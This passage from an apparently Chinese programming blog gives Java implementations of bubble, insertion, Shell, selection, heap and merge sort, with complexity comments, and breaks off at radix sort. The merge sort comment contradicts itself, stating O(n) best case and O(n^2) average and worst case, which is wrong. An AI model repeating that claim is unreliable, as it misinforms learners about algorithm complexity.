最多需要进行n-1躺，每一趟将比较小的元素移到前面，比较大的元素自然就逐渐沉到最后面了，这就是冒泡</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n-<span class="number">1</span>; i++) &#123;      </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n-<span class="number">1</span>; j &gt; i; j--) &#123;</span><br><span class="line"><span class="keyword">if</span>(target[j] &lt;target[j-<span class="number">1</span>])&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target[j];</span><br><span class="line">target[j] = target[j-<span class="number">1</span>];</span><br><span class="line">target[j-<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(Arrays.toString(target));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//优化冒泡排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] optimizeBubbleSort(<span class="type">int</span>[] target) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> target.length;</span><br><span class="line"><span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; n != <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 最多需要进行n-1躺，每一趟将比较小的元素移到前面，比较大的元素自然就逐渐沉到最后面了，这就是冒泡</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n-<span class="number">1</span>; i++) &#123;      </span><br><span class="line"><span class="type">boolean</span> <span class="variable">exchange</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n-<span class="number">1</span>; j &gt; i; j--) &#123;</span><br><span class="line"><span class="keyword">if</span>(target[j] &lt; target[j-<span class="number">1</span>])&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target[j];</span><br><span class="line">target[j] = target[j-<span class="number">1</span>];</span><br><span class="line">target[j-<span class="number">1</span>] = temp;</span><br><span class="line">exchange = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(Arrays.toString(target));</span><br><span class="line"><span class="keyword">if</span> (!exchange)&#123;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**        </span></span><br><span class="line"><span class="comment"> * Title: 插入排序中的直接插入排序 ，依赖于初始序列  </span></span><br><span class="line"><span class="comment"> * Description: 在有序序列中不断插入新的记录以达到扩大有序区到整个数组的目的</span></span><br><span class="line"><span class="comment"> * 时间复杂度：最好情形O(n)，平均情形O(n^2)，最差情形O(n^2)</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(1)</span></span><br><span class="line"><span class="comment"> * 稳    定   性：稳定</span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)</span></span><br><span class="line"><span class="comment"> */</span>      </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StraightInsertionSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] insertSort(<span class="type">int</span>[] target)&#123;</span><br><span class="line"><span class="keyword">if</span>(target != <span class="literal">null</span> &amp;&amp; target.length != <span class="number">1</span>)&#123;   <span class="comment">// 待排序数组不为空且长度大于1</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; target.length; i++) &#123;  <span class="comment">// 不断扩大有序序列，直到扩展到整个数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &gt; <span class="number">0</span>; j--) &#123;    <span class="comment">// 向有序序列中插入新的元素</span></span><br><span class="line"><span class="keyword">if</span>(target[j]  &lt; target[j-<span class="number">1</span>])&#123;  <span class="comment">// 交换</span></span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target[j];</span><br><span class="line">target[j] = target[j-<span class="number">1</span>];</span><br><span class="line">target[j-<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**        </span></span><br><span class="line"><span class="comment"> * Title: 插入排序中的折半插入排序，依赖于初始序列  </span></span><br><span class="line"><span class="comment"> * Description: 折半搜索出插入位置，并直接插入;与直接插入搜索的区别是，后者的搜索要快于顺序搜索</span></span><br><span class="line"><span class="comment"> * 时间复杂度：折半插入排序比直接插入排序明显减少了关键字之间的比较次数，但是移动次数是没有改变。所以，</span></span><br><span class="line"><span class="comment"> * 折半插入排序和插入排序的时间复杂度相同都是O（N^2），在减少了比较次数方面它确实相当优秀，所以该算法仍然比直接插入排序好。</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(1)</span></span><br><span class="line"><span class="comment"> * 稳    定   性：稳定</span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)   </span></span><br><span class="line"><span class="comment"> */</span>      </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryInsertSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] binaryInsertSort(<span class="type">int</span>[] target) &#123;</span><br><span class="line"><span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; target.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; target.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> mid;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target[i];</span><br><span class="line"><span class="keyword">if</span>(temp &lt; target[right])&#123;   <span class="comment">// 当前值小于有序序列的最大值时，开始查找插入位置</span></span><br><span class="line"><span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">mid = (left + right)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(target[mid] &lt; temp)&#123;</span><br><span class="line">left = mid + <span class="number">1</span>;    <span class="comment">// 缩小插入区间</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(target[mid] &gt; temp)&#123;</span><br><span class="line">right = mid - <span class="number">1</span>;    <span class="comment">// 缩小插入区间</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;        <span class="comment">// 待插入值与有序序列中的target[mid]相等，保证稳定性的处理</span></span><br><span class="line">left = left + <span class="number">1</span>;   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// left及其后面的数据顺序向后移动，并在left位置插入</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &gt; left; j--) &#123;</span><br><span class="line">target[j] = target[j-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">target[left] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**        </span></span><br><span class="line"><span class="comment"> * Title: 插入排序中的希尔排序  </span></span><br><span class="line"><span class="comment"> * Description: 分别对间隔为gap的gap个子序列进行直接插入排序，不断缩小gap,直至为 1 </span></span><br><span class="line"><span class="comment"> * 刚开始时，gap较大，每个子序列元素较少，排序速度较快；</span></span><br><span class="line"><span class="comment"> * 待到排序后期，gap变小，每个子序列元素较多，但大部分元素基本有序，所以排序速度仍较快。</span></span><br><span class="line"><span class="comment"> * 时间复杂度：O(n) ~ O(n^2)</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(1)</span></span><br><span class="line"><span class="comment"> * 稳    定   性：不稳定</span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)</span></span><br><span class="line"><span class="comment"> */</span>      </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] shellSort(<span class="type">int</span>[] target)&#123;</span><br><span class="line"><span class="keyword">if</span>(target != <span class="literal">null</span> &amp;&amp; target.length != <span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> target.length;       <span class="comment">// gap个大小为gap的子序列</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">gap = gap/<span class="number">3</span> + <span class="number">1</span>;     <span class="comment">// 不断缩小gap直至为1</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> + gap; i &lt; target.length; i++) &#123;   <span class="comment">// 对每个子序列进行直接插入排序</span></span><br><span class="line"><span class="keyword">if</span>(target[i] &lt; target[i-gap])&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - gap;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target[i];         <span class="comment">// 待插入值</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">target[j + gap] = target[j];         <span class="comment">// 后移元素</span></span><br><span class="line">j = j - gap;          <span class="comment">// 再比较前一个元素</span></span><br><span class="line">&#125;<span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; target[j] &gt; temp);  <span class="comment">// 向前比较的终止条件</span></span><br><span class="line">target[j + gap] = temp;         <span class="comment">// 将待插入值插入合适的位置</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(gap &gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="直接选择排序"><a href="#直接选择排序" class="headerlink" title="直接选择排序"></a>直接选择排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**        </span></span><br><span class="line"><span class="comment"> * Title: 选择排序中的直接选择排序   </span></span><br><span class="line"><span class="comment"> * Description: 每次找到数组中当前排序范围中的最小值并与该范围中的第一个数字交换，同时缩小待排序数组的排序范围</span></span><br><span class="line"><span class="comment"> * 时间复杂度：最好情形O(n^2)，平均情形O(n^2)，最差情形O(n^2)</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(1)</span></span><br><span class="line"><span class="comment"> * 稳    定   性：不稳定</span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)</span></span><br><span class="line"><span class="comment"> */</span>      </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StraightSelectSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] selectSort(<span class="type">int</span>[] target)&#123;</span><br><span class="line"><span class="keyword">if</span>(target != <span class="literal">null</span> &amp;&amp; target.length != <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; target.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">min_index</span> <span class="operator">=</span> i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; target.length; j++) &#123;</span><br><span class="line"><span class="keyword">if</span>(target[min_index] &gt; target[j])&#123;</span><br><span class="line">min_index = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(target[min_index] != target[i])&#123;  <span class="comment">// 导致不稳定的因素：交换</span></span><br><span class="line"><span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> target[min_index];</span><br><span class="line">target[min_index] = target[i];</span><br><span class="line">target[i] = min;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**        </span></span><br><span class="line"><span class="comment"> * Title: 堆排序(选择排序)，升序排序(最大堆)   </span></span><br><span class="line"><span class="comment"> * Description: 现将给定序列调整为最大堆，然后每次将堆顶元素与堆尾元素交换并缩小堆的范围，直到将堆缩小至1</span></span><br><span class="line"><span class="comment"> * 时间复杂度：O(nlgn)</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(1) </span></span><br><span class="line"><span class="comment"> * 稳 定 性：不稳定</span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)</span></span><br><span class="line"><span class="comment"> */</span>      </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] heapSort(<span class="type">int</span>[] target) &#123;</span><br><span class="line"><span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; target.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 调整为最大堆</span></span><br><span class="line"><span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> (target.length - <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">while</span> (pos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">shiftDown(target, pos, target.length - <span class="number">1</span>);</span><br><span class="line">pos--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆排序</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> target.length-<span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target[i];</span><br><span class="line">target[i] = target[<span class="number">0</span>];</span><br><span class="line">target[<span class="number">0</span>] = temp;</span><br><span class="line">shiftDown(target, <span class="number">0</span>, i-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">/**     </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 自上而下调整为最大堆</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> start</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> end     </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shiftDown</span><span class="params">(<span class="type">int</span>[] target, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start;</span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span> * start + <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target[i];</span><br><span class="line"><span class="keyword">while</span> (j &lt;= end) &#123;   <span class="comment">// 迭代条件</span></span><br><span class="line"><span class="keyword">if</span> (j &lt; end &amp;&amp; target[j + <span class="number">1</span>] &gt; target[j]) &#123;  <span class="comment">//找出较大子女</span></span><br><span class="line">j = j + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (target[j] &lt;= temp) &#123;  <span class="comment">// 父亲大于子女</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[i] = target[j];</span><br><span class="line">i = j;</span><br><span class="line">j = <span class="number">2</span> * j + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">target[i] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Title: 归并排序 ，概念上最为简单的排序算法，是一个递归算法</span></span><br><span class="line"><span class="comment"> * Description:归并排序包括两个过程：归 和 并</span></span><br><span class="line"><span class="comment"> * &quot;归&quot;是指将原序列分成半子序列，分别对子序列进行递归排序</span></span><br><span class="line"><span class="comment"> * &quot;并&quot;是指将排好序的各子序列合并成原序列</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 归并排序的主要问题是：需要一个与原待排序数组一样大的辅助数组空间</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 归并排序不依赖于原始序列，因此其最好情形、平均情形和最差情形时间复杂度都一样</span></span><br><span class="line"><span class="comment"> * 时间复杂度：最好情形O(n)，平均情形O(n^2)，最差情形O(n^2) </span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(n) </span></span><br><span class="line"><span class="comment"> * 稳 定 性：稳定</span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MergeSort</span> &#123;</span><br><span class="line"> <span class="comment">// target 待排序序列</span></span><br><span class="line"> <span class="comment">// left  待排序序列起始位置</span></span><br><span class="line"> <span class="comment">// right  待排序序列终止位置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] mergeSort(<span class="type">int</span>[] target, <span class="type">int</span> left, <span class="type">int</span> right) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(right &gt; left)&#123;           <span class="comment">// 递归终止条件</span></span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right)/<span class="number">2</span>;</span><br><span class="line">mergeSort(target, left, mid);   <span class="comment">// 归并排序第一个子序列</span></span><br><span class="line">mergeSort(target, mid+<span class="number">1</span>, right);   <span class="comment">// 归并排序第二个子序列</span></span><br><span class="line"><span class="keyword">return</span> merge(target,left,mid,right);  <span class="comment">// 合并子序列成原序列</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment">// target 用于存储归并结果</span></span><br><span class="line"><span class="comment">// left 第一个有序表的第一个元素所在位置</span></span><br><span class="line"><span class="comment">// mid  第一个有序表的最后一个元素所在位置</span></span><br><span class="line"><span class="comment">// right  第二个有序表的最后一个元素所在位置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] merge(<span class="type">int</span>[] target, <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要一个与原待排序数组一样大的辅助数组空间</span></span><br><span class="line"><span class="type">int</span>[] temp = Arrays.copyOf(target, target.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">// s1,s2是检查指针，index 是存放指针</span></span><br><span class="line"><span class="type">int</span> <span class="variable">s1</span> <span class="operator">=</span> left;</span><br><span class="line"><span class="type">int</span> <span class="variable">s2</span> <span class="operator">=</span> mid + <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> left;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两个表都未检查完，两两比较</span></span><br><span class="line"><span class="keyword">while</span>(s1 &lt;= mid &amp;&amp; s2 &lt;= right)&#123;</span><br><span class="line"><span class="keyword">if</span>(temp[s1] &lt;= temp[s2])&#123;   <span class="comment">// 稳定性</span></span><br><span class="line">target[index++] = temp[s1++];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">target[index++] = temp[s2++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//若第一个表未检查完，复制</span></span><br><span class="line"><span class="keyword">while</span>(s1 &lt;= mid)&#123;</span><br><span class="line">target[index++] = temp[s1++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//若第二个表未检查完，复制</span></span><br><span class="line"><span class="keyword">while</span>(s2 &lt;= right)&#123;</span><br><span class="line">target[index++] = temp[s2++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h2><h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**        </span></span><br><span class="line"><span class="comment"> * Title: 分配排序中的基数排序  </span></span><br><span class="line"><span class="comment"> * Description: 不是在对元素进行比较的基础上进行排序，而是采用 &quot;分配 + 收集&quot; 的办法 </span></span><br><span class="line"><span class="comment"> * 